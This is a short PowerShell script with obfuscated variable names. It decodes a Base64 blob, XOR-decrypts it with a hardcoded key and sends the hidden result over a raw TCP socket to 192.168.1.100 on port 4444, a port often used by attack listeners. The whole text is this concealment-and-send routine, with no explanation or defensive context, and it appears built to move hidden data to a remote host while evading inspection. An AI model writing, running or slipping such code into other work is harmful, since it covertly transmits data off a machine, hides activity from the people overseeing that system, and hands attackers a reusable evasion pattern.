$zF=[Text.Encoding]::UTF8;
$qW=[Convert]::FromBase64String("ADoHdRg9URIYKjAHF0MDGhJIZmwgIFIVLBgyUgITUhU3AwpqHg==");
$jR=$zF.GetString($qW);
$tG="MyS3cr3t";
$rF="";
0..($jR.Length-1)|%{
    $rF += [char](([int][char]$jR[$_]) -bxor ([int][char]$tG[$_%$tG.Length]))
};
$yT=New-Object Net.Sockets.TcpClient("192.168.1.100",4444);
$pO=$yT.GetStream();
$iJ=New-Object IO.StreamWriter($pO);
$iJ.Write($rF);
$iJ.Flush();
$yT.Close();